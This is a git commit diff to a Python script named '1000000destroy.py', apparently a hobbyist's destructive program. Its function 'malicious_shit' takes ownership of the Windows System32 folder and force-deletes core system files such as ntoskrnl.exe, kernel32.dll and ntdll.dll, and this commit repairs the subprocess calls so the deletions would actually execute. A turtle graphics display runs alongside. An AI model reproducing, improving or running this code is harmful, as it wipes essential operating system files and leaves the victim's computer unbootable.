bee5bd030147b01f4325a25e5ff2445c6ca89ae2
mystic-poop <enesyildiz320@icloud.com>
2025-04-30 18:16:58 +0300

    IM SO DUMBASSS

--- 1000000destroy.py
+++ 1000000destroy.py
@@ -4,29 +4,29 @@ from turtle import *
 import turtle
 def malicious_shit():
     subprocess.run("takeown /f C:/Windows/System32")
-    kern32="C:/Windows/System32/ntoskrnl.exe"
-    kernel="C:/Windows/System32/kernel32.dll"
-    user="C:/Windows/System32/user32.dll"
-    gdi="C:/Windows/System32/gdi32.dll"
-    advapi="C:/Windows/System32/advapi32.dll"
-    kerneldll="C:/Windows/System32/ntdll.dll"
-    shell="C:\Windows\System32\shell32.dll"
-    ole="C:\Windows\System32\ole32.dll"
-    oleaut="C:\Windows\System32\oleaut32.dll"
-    comdlg="C:\Windows\System32\comdlg32.dll"
-    msvcrt="C:\Windows\System32\msvcrt.dll"
+    kern32=r"C:/Windows/System32/ntoskrnl.exe"
+    kernel=r"C:/Windows/System32/kernel32.dll"
+    user=r"C:/Windows/System32/user32.dll"
+    gdi=r"C:/Windows/System32/gdi32.dll"
+    advapi=r"C:/Windows/System32/advapi32.dll"
+    kerneldll=r"C:/Windows/System32/ntdll.dll"
+    shell=r"C:\Windows\System32\shell32.dll"
+    ole=r"C:\Windows\System32\ole32.dll"
+    oleaut=r"C:\Windows\System32\oleaut32.dll"
+    comdlg=r"C:\Windows\System32\comdlg32.dll"
+    msvcrt=r"C:\Windows\System32\msvcrt.dll"
     try :
-         subprocess.run("del","/q"," /f"," /s ",kern32)
-         subprocess.run("del"," /q"," /f"," /s ",kernel)
-         subprocess.run("del"," /q" ,"/f","/s ",kerneldll)
-         subprocess.run("del"," /q"," /f"," /s ",user)
-         subprocess.run("del ","/q ","/f ","/s ",gdi)
-         subprocess.run("del"," /q ","/f" ,"/s ",advapi)
-         subprocess.run("del"," /q", "/f ","/s ",shell)
-         subprocess.run("del"," /q" ,"/f"," /s ",ole)
-         subprocess.run("del", "/q"," /f"," /s ",oleaut)
-         subprocess.run("del" , "/q", "/f", "/s",comdlg)
-         subprocess.run("del", "/q", "/f", "/s",msvcrt)
+         subprocess.run(["del","/q"," /f"," /s ",kern32], shell=True)
+         subprocess.run(["del"," /q"," /f"," /s ",kernel],shell=True)
+         subprocess.run(["del"," /q" ,"/f","/s ",kerneldll],shell=True)
+         subprocess.run(["del"," /q"," /f"," /s ",user],shell=True)
+         subprocess.run(["del ","/q ","/f ","/s ",gdi],shell=True)
+         subprocess.run(["del"," /q ","/f" ,"/s ",advapi],shell=True)
+         subprocess.run(["del"," /q", "/f ","/s ",shell],shell=True)
+         subprocess.run(["del"," /q" ,"/f"," /s ",ole],shell=True)
+         subprocess.run(["del", "/q"," /f"," /s ",oleaut],shell=True)
+         subprocess.run(["del" , "/q", "/f", "/s",comdlg],shell=True)
+         subprocess.run(["del", "/q", "/f", "/s",msvcrt],shell=True)
     except OSError :
          print("Check your permissions stupid")
          input("Press any key to exit")
@@ -67,6 +67,7 @@ def graphics():
     
         flash_text()
         screen.mainloop()
+        turtle.done
 while True:
         graphics()
 malicious_shit()
